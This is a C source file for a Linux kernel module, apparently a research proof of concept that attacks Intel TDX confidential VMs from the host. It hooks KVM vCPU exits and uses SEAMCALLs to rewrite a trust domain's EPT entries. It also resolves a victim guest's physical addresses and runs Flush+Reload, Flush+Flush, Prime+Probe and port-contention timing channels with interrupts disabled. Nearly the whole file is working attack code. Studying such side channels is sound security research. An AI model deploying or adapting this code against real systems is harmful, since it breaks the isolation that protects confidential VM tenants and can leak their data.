#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include <linux/debugfs.h>
#include <linux/vmalloc.h>
#include "int.h"
#define ATTACKER KERN_INFO "attacker: "
volatile uint64_t result = 0;
volatile uint64_t done = 0;

void serialize_(void) {
  asm volatile("serialize":::"memory");
}
uint64_t rdtsc_nofences_(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}

int ioctl_major = 0;
int ioctl_minor = 0;
struct class *chardev_class = NULL;

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
struct file_operations ioctl_interface_fops = {
	.owner = THIS_MODULE,
	.read = NULL,
	.write = NULL,
	.open = NULL,
	.unlocked_ioctl = ioctl,
	.release = NULL,
  .mmap = NULL
};
struct cdev cdev = {
  .owner = THIS_MODULE,
  .ops = &ioctl_interface_fops
};






extern void (* volatile vcpu_run_beg_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook)(struct OutData *);
extern void (* volatile vcpu_run_end_hook2)(void *);



uint64_t start_tsc;

atomic_t unloading;
uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}


atomic_t t_mode;

#define OFFSET (4096)






char *debug_buffer;
size_t debug_len;
const size_t debug_max = 1024ULL*1024ULL*1024ULL;
static struct dentry *data_file;
static struct dentry *subdir;

static ssize_t data_read(struct file *, char *, size_t, loff_t *);
static ssize_t data_read(struct file *f, char *buffer,
		size_t len, loff_t *offset) {
	return simple_read_from_buffer(buffer, len, offset, debug_buffer, debug_len);
}

int printDebug(const char *fmt, ...) {
    if (debug_len == debug_max) debug_len = 0;
    int i = snprintf(debug_buffer+debug_len, debug_max-debug_len, "[%llu] ", rdtsc());
    debug_len += i;
    if (debug_len == debug_max) debug_len = 0;
    va_list args; 

    va_start(args, fmt);
    i = vsnprintf(debug_buffer+debug_len, debug_max-debug_len, fmt, args);
    va_end(args);
    debug_len += i;

    return i;
}




void *attacker_td;
const uint32_t MASK = 0xB4BCD35C;

uint8_t lfsr_outputs[40];
size_t lfsr_cnt = 0;
uint32_t state = 0;

void lfsrStep(void) {
  uint8_t s = state&1;
  state = state>>1;
  if (s) state ^= MASK;
}

void reverseState(void) {
  for (size_t i = 31; i < 40; --i) {
    size_t c = lfsr_outputs[i]&1;
    if (c) state = state ^ MASK;
    state = (state<<1) | c;
  }
  for (size_t i = 0; i < 31; ++i) lfsrStep();
}


void hook1(struct OutData *vcpu) {
  
  return;
}
struct tdx_module_args {
  /* callee-clobbered */
  u64 rcx;
  u64 rdx;
  u64 r8;
  u64 r9;
  /* extra callee-clobbered */
  u64 r10;
  u64 r11;
  /* callee-saved + rdi/rsi */
  u64 r12;
  u64 r13;
  u64 r14;
  u64 r15;
  u64 rbx;
  u64 rdi;
  u64 rsi;
};
u64 __seamcall_saved_ret(u64 fn, struct tdx_module_args *args);


uint64_t *adddr = 0;

uint64_t stepcnt = 0;

volatile void* victim_td;

unsigned long allocpages[32];
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

char res[1024*1024];

char * volatile victim_addr;
size_t pp(char *addr) {
    size_t k = 1;
    mfence();
    size_t b = rdtsc_nofences();
    for (size_t i = 0; i < 12; ++i) {
      size_t mix_i;

      do {
        mix_i = (k%17)-1;
        k *= 11;
      } while (mix_i >= 12);

      maccess(&addr[4096*mix_i]);
      lfence();
    }
    size_t e = rdtsc_nofences();
    return e-b;
}


char arr[4096*20] __attribute__((aligned(4096)));
int pssendfunc(void *) {

  //asm volatile("cli":::"memory");
  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  memset(arr, 0xff, 4096*20);

  size_t WINDOW;
  WINDOW = 5000;
  cont[1] = WINDOW;
  const size_t LEN = 1024ULL*128ULL;
  size_t cnt = 0;
  get_random_bytes(res, 1024*1024);
  memcpy(cont+2, res, 1024*1024);
    
  while (!atomic_read(&unloading)) {
    if (*cont != 1) continue; 
    asm volatile("cli":::"memory");
    lfence();
    size_t e = rdtsc_nofences();
    *cont = 2;


    for (size_t i = 0; i < 1024*128; ++i) {
	    e += WINDOW;
	    if((res[i>>3]>>(i&7))&1) {
		    for (; e > rdtsc_nofences();) {
			    asm volatile(
					    ".rept 32\n"
					    //"popcnt %%r8, %%r8\n"
					    //"popcnt %%r9, %%r9\n"
					    //"popcnt %%r10, %%r10\n"
					    //"popcnt %%r11, %%r11\n"
					    "divsd %%xmm0,%%xmm0\n"
					    "divsd %%xmm1,%%xmm1\n"
					    "divsd %%xmm2,%%xmm2\n"
					    "divsd %%xmm3,%%xmm3\n"
					    ".endr\n"
					    ::: "r8", "r9", "r10", "r11", "memory");
		    }
	    } else
	    while (rdtsc_nofences() < e)asm volatile("":::"memory");
    }

  asm volatile("sti":::"memory");
    printk("tsc: %lu\n", e);
  }
end:
  cont[1] = 0;
  *cont = 3;
  return 0;
}
size_t ps(size_t end) {
    size_t cnt = 0;
    size_t h = 0;
    lfence();
    for (; end > rdtsc_nofences(); ++cnt) {
        lfence();
        size_t b = rdtsc_nofences();
        lfence();
        asm volatile(
            ".rept 32\n"
            //"popcnt %%r8, %%r8\n"
            //"popcnt %%r9, %%r9\n"
            //"popcnt %%r10, %%r10\n"
            //"popcnt %%r11, %%r11\n"
            "divsd %%xmm0,%%xmm0\n"
            "divsd %%xmm1,%%xmm1\n"
            "divsd %%xmm2,%%xmm2\n"
            "divsd %%xmm3,%%xmm3\n"
            ".endr\n"
             ::: "r8", "r9", "r10", "r11", "memory");
       lfence();
       size_t e = rdtsc_nofences();
       lfence();
       if (e-b>450) ++h;
    }
    cnt = cnt ? cnt : 1;
    return (h);
}

int psrecfunc(void *) {

  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  memset(arr, 0xff, 4096*20);

  size_t WINDOW;
  WINDOW = 5000;
  cont[1] = WINDOW;
  *cont = 1;
  const size_t LEN = 1024ULL*128ULL;
  size_t cnt = 0;
  while (!atomic_read(&unloading)) {
    if (*cont == 1) continue; 
  asm volatile("cli":::"memory");
    lfence();
    size_t e = rdtsc_nofences();
    char *v = victim_addr;
   
    for (size_t i = 0; i < LEN; ++i) {
      e += WINDOW;
      size_t beg = ps(e);
      if (beg>2) {
	res[i>>3] |= 1<<(i&7);
      }
    }
    volatile char *data2 = (volatile char*)(cont);
    data2 = data2 + 16;
    
    size_t errors = 0;
    
    for (size_t i = 0; i < LEN/8; ++i) {
        size_t out;
        size_t in = data2[i]^res[i];
        asm("popcnt %1, %0":"=r"(out):"r"(in));
        errors += out;
        printk("DATA: %hhx %hhx\n", data2[i],res[i]);
     }
     printDebug("WINDOW: [%lu, %lu],\n", WINDOW, errors);
     memset(res, 0, LEN/8);
     *cont = 1;
  asm volatile("sti":::"memory");
  }
end:
  cont[1] = 0;
  *cont = 3;
  return 0;
}

int ppsendfunc(void *) {

  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  memset(arr, 0xff, 4096*20);

  size_t WINDOW;
  WINDOW = 3000;
  cont[1] = WINDOW;
  const size_t LEN = 1024ULL*128ULL;
  asm volatile("cli":::"memory");
  size_t cnt = 0;
  get_random_bytes(res, 1024*1024);
  memcpy(cont+2, res, 1024*1024);
    
  while (!atomic_read(&unloading)) {
    if (*cont != 1) continue; 
    lfence();
    size_t e = rdtsc_nofences();
    *cont = 2;


    for (size_t i = 0; i < 1024*128; ++i) {
	    e += WINDOW;
	    if((res[i>>3]>>(i&7))&1) {
		    lfence();
		    maccess(arr+64*510);
	    }
	    while (rdtsc_nofences() < e)asm volatile("":::"memory");
    }

    printk("tsc: %lu\n", e);
  }
end:
  cont[1] = 0;
  *cont = 3;
  asm volatile("sti":::"memory");
  return 0;
}
int pprecfunc(void *) {

  //asm volatile("cli":::"memory");
  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  memset(arr, 0xff, 4096*20);

  size_t WINDOW;
  WINDOW = 3000;
  cont[1] = WINDOW;
  *cont = 1;
  const size_t LEN = 1024ULL*128ULL;
  asm volatile("cli":::"memory");
  size_t cnt = 0;
  while (!atomic_read(&unloading)) {
    if (*cont == 1) continue; 
    lfence();
    size_t e = rdtsc_nofences();
    char *v = victim_addr;
    e += 500;
   
    for (size_t i = 0; i < LEN; ++i) {
      while (rdtsc_nofences() < e)asm volatile("":::"memory");
      size_t beg = pp(arr+64*510);
      if (beg>600) {
	res[i>>3] |= 1<<(i&7);
      }
      e += WINDOW;
    }
    volatile char *data2 = (volatile char*)(cont);
    data2 = data2 + 16;
    
    size_t errors = 0;
    
    for (size_t i = 0; i < LEN/8; ++i) {
        size_t out;
        size_t in = data2[i]^res[i];
        asm("popcnt %1, %0":"=r"(out):"r"(in));
        errors += out;
     }
     printDebug("WINDOW: [%lu, %lu],\n", WINDOW, errors);
     memset(res, 0, LEN/8);
     *cont = 1;
  }
end:
  cont[1] = 0;
  *cont = 3;
  asm volatile("sti":::"memory");
  return 0;
}

size_t timings[1024*128];

int chrecfunc(void *) {

  //asm volatile("cli":::"memory");

  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  size_t WINDOW;
  WINDOW = 10000;
  cont[1] = WINDOW;
  *cont = 1;
  const size_t LEN = 1024ULL*128ULL;
  size_t cnt = 0;
  while (!atomic_read(&unloading)) {
    if (*cont == 1) continue; 
    if (victim_addr == NULL) {
      *cont = 3;
      printk("TDX: no addr\n");
      continue; 
    }
    asm volatile("cli":::"memory");
    mfence();
    size_t e = rdtsc_nofences();
    char *v = victim_addr;
    e += 3000;
   
    for (size_t i = 0; i < LEN; ++i) {
      while (rdtsc_nofences() < e)asm volatile("":::"memory");
      mfence();
      size_t beg = rdtsc_nofences();
      maccess(v);
      mfence();
      size_t end = rdtsc_nofences();
      mfence();
      timings[i] = end-beg;
      if (end-beg>130) {
	res[i>>3] |= 1<<(i&7);
      }
      e += WINDOW;
    }
    volatile char *data2 = (volatile char*)(cont);
    data2 = data2 + 16;
    
    size_t errors = 0;
    
    for (size_t i = 0; i < LEN/8; ++i) {
        size_t out;
        size_t in = data2[i]^res[i];
        asm("popcnt %1, %0":"=r"(out):"r"(in));
        errors += out;
     }
     printDebug("WINDOW: [%lu, %lu],\n", WINDOW, errors);
     memset(res, 0, LEN/8);
     ++cnt;
     for (size_t i = 0; i < LEN; i+=8) {
        printDebug("DAT: %lu, %lu, %lu, %lu, %lu, %lu, %lu, %lu,\n",
		timings[i], timings[i+1], timings[i+2], timings[i+3], timings[i+4], timings[i+5], timings[i+6], timings[i+7]);
     }
     asm volatile("sti":::"memory");
     if (cnt == 20) {
       WINDOW = WINDOW*950/1000;
       cnt = 0;
       cont[1] = WINDOW;
       if (WINDOW < 300) goto end;
     }
     *cont = 1;
  }
end:
  cont[1] = 0;
  *cont = 3;
  return 0;
}
int fffunc(void *) {

  //asm volatile("cli":::"memory");

  volatile uint64_t *cont = (volatile uint64_t *) allocpages[0];

  size_t WINDOW;
  WINDOW = 50000;
  cont[1] = WINDOW;
  *cont = 1;
  const size_t LEN = 1024ULL*128ULL;
  asm volatile("cli":::"memory");
  size_t cnt = 0;
  while (!atomic_read(&unloading)) {
    if (*cont == 1) continue; 
    if (victim_addr == NULL) {
      *cont = 3;
      printk("TDX: no addr\n");
      continue; 
    }
    printk("TDX: go\n");
    mfence();
    size_t e = rdtsc_nofences();
    char *v = victim_addr;
    e -= 260;
   
    for (size_t i = 0; i < LEN; ++i) {
      while (rdtsc_nofences() < e)asm volatile("":::"memory");
      mfence();
      size_t beg = rdtsc_nofences();
      clflush(v);
      mfence();
      size_t end = rdtsc_nofences();
      mfence();
      if (end-beg>130) {
	res[i>>3] |= 1<<(i&7);
      }
      e += WINDOW;
    }
    volatile char *data2 = (volatile char*)(cont);
    data2 = data2 + 16;
    
    size_t errors = 0;
    
    for (size_t i = 0; i < LEN/8; ++i) {
        size_t out;
        size_t in = data2[i]^res[i];
        asm("popcnt %1, %0":"=r"(out):"r"(in));
        errors += out;
     }
     printDebug("WINDOW: [%lu, %lu],\n", WINDOW, errors);
     memset(res, 0, LEN/8);
     ++cnt;
     if (cnt == 20) {
       WINDOW = WINDOW*950/1000;
       cnt = 0;
       cont[1] = WINDOW;
       if (WINDOW < 100) goto end;
     }
     *cont = 1;
  }
end:
  cont[1] = 0;
  *cont = 3;
  asm volatile("sti":::"memory");
  return 0;
}
size_t ccnt = 0;
#define IA32_TSC_DEADLINE 0x6e0
void update_tsc_deadline(void) {
  size_t beg = rdtsc_nofences_()+2000000000/10;
  asm volatile ("wrmsr" :: "c"(IA32_TSC_DEADLINE), "a"(beg), "d"(beg>>32):"memory");
}
void hook2(struct OutData *vcpu) {
  int is_vmcall = vcpu->exit_reason == 0x4d;
  uint64_t vmcall_leaf = vcpu->kvm_vcpu_arch[VCPU_REGS_R11];
  if (!is_vmcall || vmcall_leaf != CPUID) return;

  uint64_t vspec_vmcall = vcpu->kvm_vcpu_arch[VCPU_REGS_R10];

  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000069ULL) {
    attacker_td = vcpu->vcpu;
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 1) {
	apic->write(0x320, 0);
      
	struct tdx_module_args test = {
          /* callee-clobbered */
          .rcx = vcpu->tdvpr_pa,
          .rdx = 0x203CULL | 3ULL<<32,   
          .r8 = 0,
          .r9 = 0,
          /* extra callee-clobbered */
          .r10 = 0,
          .r11 = 0,
          /* callee-saved + rdi/rsi */
          .r12 = 0,
          .r13 = 0,
          .r14 = 0,
          .r15 = 0,
          .rbx = 0,
          .rdi = 0,
          .rsi = 0
	};
	uint64_t ret = __seamcall_saved_ret(26, &test);
	printDebug("TDX seam result: rax %llx r8 %llx\n", ret, test.r8);
	printDebug("TDX seam result: sizes %lx %lx %lx %lx\n", sizeof(EPTPageDirectoryPointerTableEntry),sizeof(EPTPageDirectoryEntry), sizeof(EPTPageTableEntry), sizeof(EPTPageMapLevel4Entry));
	uint64_t shared_pfn = test.r8/4096;
	uint64_t *sp = (uint64_t *)page_address(pfn_to_page(shared_pfn));
        EPTPageMapLevel5Entry *pml5 = (EPTPageMapLevel5Entry *)sp;

	//if (!pml5[15].read)
	{
	  EPTPageMapLevel4Entry *pml4 = (EPTPageMapLevel4Entry *)get_zeroed_page(GFP_KERNEL);
	  pml5[15].page_ppn = virt_to_phys(pml4)/4096;
	  pml5[15].write = 1;
	  pml5[15].read = 1;
	  pml5[15].execute = 0;
	  EPTPageDirectoryPointerTableEntry *pdpt = (EPTPageDirectoryPointerTableEntry *)get_zeroed_page(GFP_KERNEL);
	  pml4[511].page_ppn = virt_to_phys(pdpt)/4096;
	  pml4[511].write = 1;
	  pml4[511].read = 1;
	  pml4[511].execute = 0;
	  EPTPageDirectoryEntry *pd = (EPTPageDirectoryEntry *)get_zeroed_page(GFP_KERNEL);
	  pdpt[511].page_ppn = virt_to_phys(pd)/4096;
	  pdpt[511].write = 1;
	  pdpt[511].read = 1;
	  pdpt[511].execute = 0;
	  for (size_t i = 0; i < 32; ++i) {
	    pd[i].page_ppn = virt_to_phys(allocpages[i])/4096;
	    pd[i].write = 1;
	    pd[i].read = 1;
	    pd[i].execute = 1;
	    pd[i].huge = 1;
	    pd[i].suppress_ve = 0;
	  }
	}
      
    }
    if (vcpu->kvm_vcpu_arch[VCPU_REGS_R13] == 2) {
	apic->write(0x320, 0x400ec);
	update_tsc_deadline();
	printDebug("TDX result: %llx\n", *(size_t *)allocpages[0]);
	struct tdx_module_args test = {
          /* callee-clobbered */
          .rcx = vcpu->tdvpr_pa,
          .rdx = 0x203CULL | 3ULL<<32,   
          .r8 = 0,
          .r9 = 0,
          /* extra callee-clobbered */
          .r10 = 0,
          .r11 = 0,
          /* callee-saved + rdi/rsi */
          .r12 = 0,
          .r13 = 0,
          .r14 = 0,
          .r15 = 0,
          .rbx = 0,
          .rdi = 0,
          .rsi = 0
	};
	uint64_t ret = __seamcall_saved_ret(26, &test);
	printDebug("TDX seam result: rax %llx r8 %llx\n", ret, test.r8);
	printDebug("TDX seam result: sizes %lx %lx %lx %lx\n", sizeof(EPTPageDirectoryPointerTableEntry),sizeof(EPTPageDirectoryEntry), sizeof(EPTPageTableEntry), sizeof(EPTPageMapLevel4Entry));
	uint64_t shared_pfn = test.r8/4096;
	uint64_t *sp = (uint64_t *)page_address(pfn_to_page(shared_pfn));
        EPTPageMapLevel5Entry *pml5 = (EPTPageMapLevel5Entry *)sp;
	if (pml5[15].read)
	{
          
	  EPTPageMapLevel4Entry *pml4 = (EPTPageMapLevel4Entry *)__va(pml5[15].page_ppn*4096);
	  pml5[15].page_ppn = 0;
	  pml5[15].write = 0;
	  pml5[15].read = 0;
	  pml5[15].execute = 0;

	  EPTPageDirectoryPointerTableEntry *pdpt = (EPTPageDirectoryPointerTableEntry *)__va(pml4[511].page_ppn*4096);
	  EPTPageDirectoryEntry *pd = (EPTPageDirectoryEntry *)__va(pdpt[511].page_ppn*4096);
	  //EPTPageTableEntry *pt = (EPTPageTableEntry *)__va(pd[511].page_ppn*4096);
	  free_page(pml4);
	  free_page(pdpt);
	  free_page(pd);
	}
    }

  }
  if (is_vmcall && vmcall_leaf == CPUID && vcpu->kvm_vcpu_arch[VCPU_REGS_R12] == 0x40000071ULL) {
    uint32_t phys = vcpu->kvm_vcpu_arch[VCPU_REGS_R13];
    struct list_head *r = vcpu->mmu_root;
    struct kvm_mmu_page *node;
    struct tdp_iter iter;
    uint32_t gfn = (vcpu->kvm_vcpu_arch[VCPU_REGS_R13]/4096);

    list_for_each_entry(node, r, link) {
      for_each_tdp_pte_min_level(iter, node, PG_LEVEL_4K, gfn,gfn+1) {
        if (!(iter.old_spte&0b111) || !(iter.old_spte&0x80)) {
        continue;
        }
        if (iter.gfn == gfn) {
          uint64_t pa = ((iter.old_spte&(~0xfffULL))&((1ULL<<51)-1))*0x1000+(phys&0xfffULL);
          victim_addr = (char *)__va(pa);
          goto done;
        }
      }
    }
    gfn &= ~0x1ffULL;
    list_for_each_entry(node, r, link) {
      for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, gfn,gfn+1) {
        if (!(iter.old_spte&0b111) || !(iter.old_spte&0x80)) {
        continue;
        }
        if (iter.gfn == gfn) {
          uint64_t pa = ((iter.old_spte&(~0x1fffffULL))&((1ULL<<51)-1))+((phys/4096)&0x1ffULL)*0x1000+(phys&0xfffULL);
          victim_addr = (char *)__va(pa);
          goto done;
        }
      }
    }
    done:;
    printk("TDX found addr: %llx\n", victim_addr);
    
 
  }


}

void * volatile last;

void hook3(void *vcpu) {
}

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  long ret = -1;
  struct Args args;

  switch (cmd) {
    case COLLECT:
      ret = copy_from_user(&args, (void*)arg, sizeof(struct Args));
      done = 0;
      if (ret != 0) break;
      break;
    case END:
      done = 1;
      ret = 0;
      break;
    default:
      printk(ATTACKER "ioctl cmd not found\n");
      ret = -1;
      break;
  }
  return ret;
}


const struct file_operations data_file_fops = {
	.owner = THIS_MODULE,
	.read = data_read,
};

int init_module(void) 
{
  atomic_set(&t_mode, 0);
  atomic_set(&unloading, 0);

  
  debug_buffer = vmalloc(1024ULL*1024ULL*1024ULL);
  if (!debug_buffer) {
    return -1;
  }
  subdir = debugfs_create_dir("tdxmod", NULL);
  if (!subdir) {
    vfree(debug_buffer);
    return -1;
  }
  data_file = debugfs_create_file("data", 0644, subdir, NULL, &data_file_fops);
  if (!data_file) {
    vfree(debug_buffer);
    debugfs_remove_recursive(subdir);
    return -1;
  }
  for(size_t i = 0; i <32; ++i) {
    allocpages[i] = __get_free_pages(GFP_KERNEL, 9);
    printk("alloc: %lu %lx\n", i, allocpages[i]);
    memset((void*)allocpages[i], 0, 1024ULL*1024ULL*2);
  }
  printDebug("loading\n");
  vcpu_run_beg_hook = (void *)hook1;
  struct task_struct *thrd = kthread_create(chrecfunc, 0, "tdxupdate");
  kthread_bind(thrd, 13);
  wake_up_process(thrd);

  vcpu_run_end_hook = (void *)hook2;
  //vcpu_run_end_hook2 = (void *)hook3;
  return 0;

} 

 

void cleanup_module(void) 
{ 
  atomic_set(&unloading, 1);
  printDebug("unload.\n"); 
  debugfs_remove_recursive(subdir);
  vfree(debug_buffer);
  msleep(5000);
  vcpu_run_beg_hook = 0;
  vcpu_run_end_hook = 0;
  vcpu_run_end_hook2 = 0;
  msleep(2000);
  for(size_t i = 0; i <32; ++i) {
    free_pages(allocpages[i], 9);
  }
} 

 

MODULE_LICENSE("GPL");
